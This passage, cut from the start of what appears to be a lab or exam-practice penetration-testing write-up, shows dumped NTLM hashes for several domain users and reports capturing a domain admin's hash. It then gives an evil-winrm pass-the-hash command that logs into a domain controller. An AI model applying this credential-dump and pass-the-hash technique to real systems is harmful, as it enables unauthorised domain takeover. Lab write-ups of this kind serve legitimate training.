David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```
=> we got the NTLM-Hash of `tom_admin` which is a domain admin :D

# DC01 access

```bash
evil-winrm -i 10.10.197.140 -u 'oscp.exam\tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc
```
GG
